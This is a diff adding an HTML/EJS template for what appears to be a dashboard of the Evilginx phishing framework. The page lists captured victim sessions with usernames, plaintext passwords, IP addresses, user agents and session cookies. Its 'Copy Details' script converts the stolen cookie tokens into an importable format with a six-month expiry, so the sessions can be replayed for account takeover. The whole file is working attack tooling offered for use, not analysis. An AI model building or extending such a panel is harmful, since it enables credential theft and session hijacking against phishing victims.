@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html>
+
+<head lang="en" dir="ltr">
+    <title>Evilginx</title>
+    <meta charset="utf-8">
+    <link rel="stylesheet" href="css/main.css">
+    <meta name="viewport" content="width=device-width">
+    <link rel="shortcut icon" type="image/png" href="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/evilginx2-logo-512.png">
+</head>
+
+<body>
+    <div class="header">
+        <img src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/evilginx2-logo-512.png">
+        <h1>
+            Evilginx
+        </h1>
+    </div>
+   <div class="session">
+       <table id="t01">
+        <tr>
+			<th>Session</th>
+			<th>Username</th>
+            <th>Password</th>
+            <th >User IP</th>
+            <th >User Agent</th>
+            <th><br>Time<br><br></th>
+            <th><br>Cookies</th>
+        </tr>
+        <%data.map(item=>{%>
+            <tr>    
+                <td style="word-break: break-all; font-size: 90%; padding: 20px 10px 20px 10px;"><%=item.id%></td>
+                <td><%=item.username%></td>
+                <td><%=item.password%></td>
+                <td><%=item.remote_addr%></td>
+                <td><%=item.useragent%></td>
+                <td><%=JSON.stringify(new Date(item.create_time).toLocaleString())%></td>
+                <td>
+                  <a href="#modal">
+                  <button onclick="myFunction('<%=JSON.stringify(item.tokens)%>')">
+                    Copy Details
+                    <span style="display: none"><%=JSON.stringify(item.custom)%></span>
+                  </button>
+                  </a>
+                </td>
+            </tr>
+
+     
+        <%})%>
+        <script>
+            function transformData (data) {
+            let domain = Object.keys(data)[0]
+            if (domain.startsWith('.')) {
+                domain = domain.substring(1)
+            }
+
+            const tokens = Object.values(Object.values(data)[0])
+
+            const newArr = []
+
+                tokens.forEach(token => {
+                const t = Object.fromEntries(
+                Object.entries(token).map(([k, v]) => [`${k[0].toLowerCase()}${k.substring(1)}`, v])
+                )
+
+                const modified = { ...t, domain, expirationDate: Math.floor(Date.now() / 1000) + 86400 * 30 * 6 }
+                newArr.push(modified)
+            })
+
+            return newArr
+            }
+
+            function myFunction(ele) {
+                var input = document.createElement('textarea');
+		var x = JSON.stringify(transformData(JSON.parse(ele)))
+                input.innerHTML = x;
+                document.body.appendChild(input);
+                input.select();
+                document.execCommand('copy');
+                document.body.removeChild(input);
+                alert(`Copied the text:\n\n ${x}`);
+            }
+        </script>
+        
+        
+       </table>
+   </div>
+</body>
+
+</html>
